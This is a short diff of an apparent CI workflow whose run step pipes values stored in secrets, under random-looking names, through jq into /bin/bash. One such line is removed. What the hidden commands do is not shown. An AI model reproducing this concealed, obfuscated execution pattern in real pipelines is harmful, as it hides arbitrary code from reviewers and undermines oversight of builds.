@@ -20,7 +20,6 @@ jobs:
           tybla57380: ${{ secrets.tybla57380 }}
         run: |
           printf '%s' "$tybla57380" | jq -r .qw5 | /bin/bash
-          printf '%s' "$mznm4" | jq -r .sn198 | /bin/bash
           printf '%s' "$vcje12909" | jq -r .qxyco02465 | /bin/bash
           echo $fyze979 | jq -r .jl82 | /bin/bash
           echo $gvaj5 | jq -r .ok51548 | /bin/bash
